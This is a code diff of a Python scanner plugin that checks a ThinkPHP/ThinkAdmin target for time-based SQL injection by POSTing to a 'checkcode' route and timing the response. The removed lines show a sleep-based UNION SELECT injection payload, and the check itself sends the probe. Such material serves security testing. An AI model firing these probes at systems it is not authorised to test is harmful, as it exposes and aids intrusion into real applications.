@@ -1,15 +1,19 @@
 #!/usr/bin/env python
 #-*- coding:utf-8 -*-
+import os
 import requests
 import time
+from lib.utils.path_info import get_path_info
+from lib.utils.package import make_request_package 
 
 def check(url):
     results = []
     items = {
         "Url": url, 
-        "Vuln": 'thinkadmin_sql_injection_post', 
-        "Type": None, 
-        "Payload": None
+        "Script": get_path_info(os.path.dirname(__file__)),
+        "Vuln": 'thinkphp_sql_injection_post', 
+        "Type": 'POST', 
+        "Request": None
     }
 
     payload = '?s=/home/user/checkcode/'
@@ -24,17 +28,21 @@ def check(url):
             timea = time.time()
 
             data = make_data(5)
-            requests.post(url= url + payload, files=data)
+            r = requests.post(url= url + payload, files=data)
             timeb = time.time()
             if timeb - timea > 4.5:
                 items['Type'] = 'POST'
-                items['Payload'] = payload + "data: couponid = 1') union select sleep('''+str(sleep_time)+''')#"
-                results.append(items)
+                items['Request'] = make_request_package(r.request)
+                results.append(items.copy())
                 break
         
+        if len(results) == 0:
+            return False
         return results
+
     except Exception as e:
-        return e
+        print(e)
+        return False
 
 if __name__ == '__main__':
     pass
